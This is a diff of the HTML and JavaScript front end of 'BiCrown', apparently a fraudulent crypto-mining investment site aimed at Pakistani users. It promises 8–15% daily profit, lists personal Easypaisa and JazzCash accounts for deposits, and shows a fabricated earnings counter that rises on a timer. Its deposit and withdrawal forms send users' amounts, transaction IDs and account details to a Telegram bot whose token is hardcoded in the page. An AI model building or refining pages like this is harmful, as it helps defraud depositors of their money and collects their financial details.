@@ -3,42 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>BiCrown | Ultimate Mining</title>
+    <title>BiCrown | Official Mining</title>
     <style>
         :root { --gold: #ffd700; --purple: #bc13fe; --dark: #000; --card: #121212; --success: #00ff88; }
         body { font-family: 'Inter', sans-serif; background: var(--dark); color: white; margin: 0; padding-bottom: 80px; }
-        
-        /* Auth Screen */
         #auth-screen { position: fixed; inset: 0; background: #000; z-index: 2000; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
         .auth-card { background: var(--card); padding: 25px; border-radius: 20px; border: 1px solid #333; width: 100%; max-width: 350px; text-align: center; }
-        
-        /* Tickers */
         .ticker { background: #1a1a1a; color: var(--gold); padding: 8px; font-size: 11px; overflow: hidden; white-space: nowrap; border-bottom: 1px solid #333; }
         .ticker-move { display: inline-block; animation: move 15s linear infinite; }
         @keyframes move { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
-
-        /* Navigation */
         .bottom-nav { position: fixed; bottom: 0; width: 100%; background: #080808; display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid #222; z-index: 1000; }
         .nav-item { color: #555; text-align: center; font-size: 11px; cursor: pointer; }
         .nav-item.active { color: var(--gold); }
-
-        /* Pages */
         .page { display: none; padding: 15px; animation: fadeIn 0.3s ease; }
         .page.active { display: block; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-
-        /* UI Elements */
         .card { background: var(--card); border-radius: 15px; padding: 15px; border: 1px solid #222; margin-bottom: 15px; }
         .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
         .balance-box { background: linear-gradient(135deg, #1a1a1a, #000); border: 1px solid var(--gold); padding: 25px; border-radius: 20px; text-align: center; margin-bottom: 20px; }
-        
         input, select { width: 100%; padding: 14px; background: #080808; border: 1px solid #333; border-radius: 12px; color: white; margin: 8px 0; box-sizing: border-box; }
         .btn-gold { width: 100%; padding: 15px; background: linear-gradient(45deg, var(--gold), #b8860b); border: none; border-radius: 12px; font-weight: bold; cursor: pointer; color: black; }
         .btn-code { background: #222; color: var(--gold); font-size: 10px; padding: 5px; border-radius: 5px; border: 1px solid var(--gold); cursor: pointer; }
-
         .plan-card { border-left: 5px solid var(--gold); margin-bottom: 10px; background: #111; padding: 15px; border-radius: 10px; display: flex; justify-content: space-between; align-items: center; }
-
-        /* Telegram Float */
         #tg-support { position: fixed; bottom: 90px; right: 20px; background: #0088cc; width: 55px; height: 55px; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); z-index: 1500; border: 2px solid white; cursor: pointer; }
     </style>
 </head>
@@ -46,36 +32,32 @@
 
     <div id="auth-screen">
         <div class="auth-card">
-            <img src="https://img.icons8.com/color/96/crown.png" width="60">
-            <h2 style="color: var(--gold);">BiCrown Login</h2>
-            <input type="text" id="u-mail" placeholder="Email or Phone">
-            <input type="password" id="u-pass" placeholder="Password">
-            <div style="display: flex; gap: 5px; align-items: center;">
-                <input type="text" placeholder="Verification Code" style="flex: 1;">
-                <span class="btn-code" onclick="alert('Code sent!')">GET CODE</span>
+            <h2 style="color: var(--gold);">BiCrown</h2>
+            <input type="text" id="u-mail" placeholder="Phone or Email">
+            <input type="password" placeholder="Password">
+            <div style="display: flex; gap: 5px;">
+                <input type="text" placeholder="Code" style="flex: 1;">
+                <span class="btn-code" onclick="alert('Code Sent!')">GET CODE</span>
             </div>
-            <button class="btn-gold" style="margin-top: 15px;" onclick="handleAuth()">Login / Sign Up</button>
+            <button class="btn-gold" onclick="handleAuth()">LOGIN / SIGNUP</button>
         </div>
     </div>
 
     <div id="app-content" style="display:none;">
-        <div class="ticker"><div class="ticker-move">BTC: $64,231.50 (+2%) | BiCrown VIP Rewards Active | Payouts Processing...</div></div>
+        <div class="ticker"><div class="ticker-move">BiCrown VIP Mining is Live | Withdrawals: 10AM - 10PM | Daily Profit: 8% - 15%</div></div>
 
         <div id="p-dash" class="page active">
             <div class="balance-box">
-                <p style="color: #888; margin: 0;">Total Balance</p>
-                <h1 style="font-size: 35px; color: var(--gold); margin: 10px 0;">Rs <span id="t-bal">0.00</span></h1>
-                <p style="font-size: 12px; color: var(--success);">● Mining: <span id="m-status">Waiting for Deposit</span></p>
+                <p style="color: #888;">Available Balance</p>
+                <h1 style="color: var(--gold); font-size: 38px;">Rs <span id="t-bal">0.00</span></h1>
+                <p style="font-size: 11px; color: var(--success);">● Mining Status: <span id="m-status">Deposit to Start</span></p>
             </div>
             <div class="stat-grid">
-                <div class="card"><h5>Total Earning</h5><h3 style="color: var(--success);">Rs <span id="t-earn">0.00</span></h3></div>
-                <div class="card"><h5>Total Deposit</h5><h3>Rs <span id="t-dep">0.00</span></h3></div>
+                <div class="card"><h5>Total Earn</h5><h3 id="t-earn">0.00</h3></div>
+                <div class="card"><h5>Total Deposit</h5><h3 id="t-dep-show">0.00</h3></div>
             </div>
-            <div class="card">
-                <div style="display:flex; justify-content:space-between; align-items:center;">
-                    <span>Auto Re-invest</span>
-                    <input type="checkbox" style="width: 20px; margin: 0;">
-                </div>
+            <div class="card" onclick="nav('with', document.querySelectorAll('.nav-item')[3])" style="text-align: center; border: 1px solid var(--gold); cursor: pointer;">
+                <span style="color: var(--gold); font-weight: bold;">💰 QUICK WITHDRAW</span>
             </div>
         </div>
 
@@ -85,7 +67,7 @@
         </div>
 
         <div id="p-recharge" class="page">
-            <h2>Deposit Funds</h2>
+            <h2>Deposit Center</h2>
             <div id="dep-step-1">
                 <div class="card" onclick="setMet('Easypaisa')">Easypaisa (Bus Pari)</div>
                 <div class="card" onclick="setMet('JazzCash')">JazzCash (Shahid Anwar)</div>
@@ -95,56 +77,50 @@
                     <p>Name: <strong id="acc-name"></strong></p>
                     <p>Number: <strong id="acc-num"></strong></p>
                 </div>
-                <input type="number" id="d-amt" placeholder="Amount (PKR)">
+                <input type="number" id="d-amt" placeholder="Sent Amount">
                 <input type="text" id="d-trx" placeholder="TRX ID">
-                <button class="btn-gold" onclick="submitDep()">Submit Payment</button>
+                <button class="btn-gold" onclick="submitDep()">SUBMIT PROOF</button>
             </div>
         </div>
 
-        <div id="p-team" class="page">
-            <h2>My Team</h2>
+        <div id="p-with" class="page">
+            <h2>Withdrawal</h2>
             <div class="card">
-                <p>Referral Link:</p>
-                <div style="background:#000; padding:10px; border-radius:8px; border:1px solid #333; font-size:11px; color: var(--success);" id="ref-link">
-                    https://bicrown.app/join?ref=BC742
-                </div>
-                <p style="font-size:12px; margin-top:10px;">Referral By: <span style="color:var(--gold)">Admin_BiCrown</span></p>
+                <p style="font-size:12px; color:#888;">Min Withdraw: Rs 500</p>
+                <select id="w-met"><option>Easypaisa</option><option>JazzCash</option></select>
+                <input type="text" id="w-num" placeholder="Account Number">
+                <input type="text" id="w-name-acc" placeholder="Account Name">
+                <input type="number" id="w-amt" placeholder="Amount (PKR)">
+                <button class="btn-gold" onclick="submitWith()">REQUEST WITHDRAW</button>
             </div>
-            <h3>18 Levels Reward</h3>
-            <div id="levels-box" style="max-height: 250px; overflow-y: auto;"></div>
         </div>
 
         <div id="p-settings" class="page">
-            <div style="text-align:center; padding: 20px;">
-                <div style="position:relative; display:inline-block;">
-                    <img id="u-pic" src="https://i.pravatar.cc/100" style="width:80px; height:80px; border-radius:50%; border:3px solid var(--gold);">
-                    <label for="img-up" style="position:absolute; bottom:0; right:0; background:var(--gold); color:black; border-radius:50%; width:24px; height:24px; cursor:pointer; display:flex; align-items:center; justify-content:center;">✎</label>
-                    <input type="file" id="img-up" hidden onchange="updateProfilePic(event)">
-                </div>
+            <div style="text-align:center; padding: 15px;">
+                <img src="https://i.pravatar.cc/100" style="width:70px; border-radius:50%; border:2px solid var(--gold);">
                 <h3>Shahid Anwar</h3>
-                <p style="color: #888;">Rank: Bronze Miner</p>
+                <p style="color:var(--gold); font-size:12px;">Level: 18 (VIP)</p>
             </div>
-            <div class="card" onclick="window.open('https://t.me/BiCrown_Official_Group', '_blank')" style="background: rgba(0, 136, 204, 0.1); border-color: #0088cc;">
-                <div style="display:flex; align-items:center; gap:10px;">
-                    <img src="https://img.icons8.com/color/48/telegram-app.png" width="30">
-                    <div><strong>Official Telegram Group</strong><p style="margin:0; font-size:11px; color:#888;">Join for daily updates</p></div>
-                </div>
+            <div class="card">
+                <strong>My Referral Link:</strong><br>
+                <small style="color:var(--success)">https://bicrown.com/reg?ref=7842</small>
             </div>
-            <div class="card" onclick="alert('Profile Saved')">Edit Profile</div>
-            <div class="card" style="color:red" onclick="location.reload()">Logout Account</div>
+            <div class="card" onclick="window.open('https://t.me/BiCrown_Admin')">Telegram Support</div>
+            <div class="card" onclick="window.open('https://t.me/BiCrown_Official_Group')">Official Group</div>
+            <button class="btn-gold" style="background:#222; color:red;" onclick="location.reload()">LOGOUT</button>
         </div>
 
         <nav class="bottom-nav">
-            <div class="nav-item active" onclick="nav('dash', this)">🏠 Dashboard</div>
+            <div class="nav-item active" onclick="nav('dash', this)">🏠 Dash</div>
             <div class="nav-item" onclick="nav('invest', this)">💎 Plans</div>
             <div class="nav-item" onclick="nav('recharge', this)">💳 Deposit</div>
-            <div class="nav-item" onclick="nav('team', this)">👥 Team</div>
-            <div class="nav-item" onclick="nav('settings', this)">⚙️ Settings</div>
+            <div class="nav-item" onclick="nav('with', this)">💰 With</div>
+            <div class="nav-item" onclick="nav('settings', this)">⚙️ Set</div>
         </nav>
     </div>
 
-    <div id="tg-support" onclick="window.open('https://t.me/BiCrown_Admin', '_blank')">
-        <img src="https://img.icons8.com/color/48/telegram-app.png" width="35">
+    <div id="tg-support" onclick="window.open('https://t.me/BiCrown_Admin')">
+        <img src="https://img.icons8.com/color/48/telegram-app.png" width="30">
     </div>
 
     <script>
@@ -171,47 +147,43 @@
             document.getElementById('acc-num').innerText = m === 'Easypaisa' ? '03431793371' : '03020928966';
         }
 
+        const botToken = "8494802061:AAHOhQJElPVkOqCuyZ0cP5PKL3k0_P50dDE";
+        const chatId = "7005219148";
+
         function submitDep() {
             const amt = document.getElementById('d-amt').value;
             const trx = document.getElementById('d-trx').value;
-            if(!amt || !trx) return alert("Fill details!");
-
-            const token = "8494802061:AAHOhQJElPVkOqCuyZ0cP5PKL3k0_P50dDE";
-            const chat = "7005219148";
-            const message = `👑 *NEW BICROWN DEPOSIT*%0A%0A💰 *Amount:* Rs ${amt}%0A🏦 *Method:* ${currentMet}%0A🆔 *TRX ID:* ${trx}%0A👤 *User:* Shahid_Anwar`;
-
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${message}&parse_mode=Markdown`)
+            if(!amt || !trx) return alert("Fill all fields!");
+            const msg = `💰 *NEW DEPOSIT*%0AAmount: Rs ${amt}%0AMethod: ${currentMet}%0ATRX: ${trx}%0AUser: ${document.getElementById('u-mail').value}`;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${msg}&parse_mode=Markdown`)
             .then(() => {
-                alert("✅ Request Sent!");
-                location.reload();
+                alert("Deposit proof submitted! Pending approval.");
+                nav('dash', document.querySelectorAll('.nav-item')[0]);
             });
         }
 
-        function updateProfilePic(e) {
-            const r = new FileReader();
-            r.onload = () => document.getElementById('u-pic').src = r.result;
-            r.readAsDataURL(e.target.files[0]);
+        function submitWith() {
+            const amt = document.getElementById('w-amt').value;
+            const num = document.getElementById('w-num').value;
+            const name = document.getElementById('w-name-acc').value;
+            if(!amt || !num) return alert("Fill all fields!");
+            const msg = `💸 *WITHDRAW REQUEST*%0AAmount: Rs ${amt}%0AMethod: ${document.getElementById('w-met').value}%0ANumber: ${num}%0AName: ${name}`;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${msg}&parse_mode=Markdown`)
+            .then(() => alert("Withdraw request sent to admin!"));
         }
 
         const pl = document.getElementById('plan-list');
-        const startAmts = [450, 700, 1000, 2000, 5000, 10000, 25000, 50000, 100000];
-        startAmts.forEach(amt => {
-            pl.innerHTML += `<div class="plan-card">
-                <div><h4>Rs ${amt} Plan</h4><p style="color:var(--success); font-size:12px; margin:0;">Daily: Rs ${(amt*0.08).toFixed(0)}</p></div>
-                <button class="btn-gold" style="width:80px; padding:8px;" onclick="nav('recharge', document.querySelectorAll('.nav-item')[2])">Invest</button>
-            </div>`;
+        const amts = [450, 700, 1000, 2000, 5000, 10000, 50000, 100000];
+        amts.forEach(a => {
+            pl.innerHTML += `<div class="plan-card"><div><h4>Rs ${a} Plan</h4><p style="color:var(--success)">Profit: Rs ${(a*0.08).toFixed(0)}/Day</p></div><button class="btn-gold" style="width:70px;" onclick="nav('recharge', document.querySelectorAll('.nav-item')[2])">BUY</button></div>`;
         });
 
-        const lb = document.getElementById('levels-box');
-        for(let i=1; i<=18; i++) {
-            lb.innerHTML += `<div style="display:flex; justify-content:space-between; padding:8px; border-bottom:1px solid #222; font-size:11px;"><span>Level ${i} Reward</span><span style="color:var(--purple)">${(15 - i*0.7).toFixed(1)}%</span></div>`;
-        }
-
-        let totalEarn = 0;
+        let e = 0;
         setInterval(() => {
-            if(parseFloat(document.getElementById('t-bal').innerText) > 0) {
-                totalEarn += 0.01;
-                document.getElementById('t-earn').innerText = totalEarn.toFixed(2);
+            let bal = parseFloat(document.getElementById('t-bal').innerText);
+            if(bal > 0) {
+                e += 0.01;
+                document.getElementById('t-earn').innerText = e.toFixed(2);
                 document.getElementById('m-status').innerText = "Mining Active...";
             }
         }, 3000);
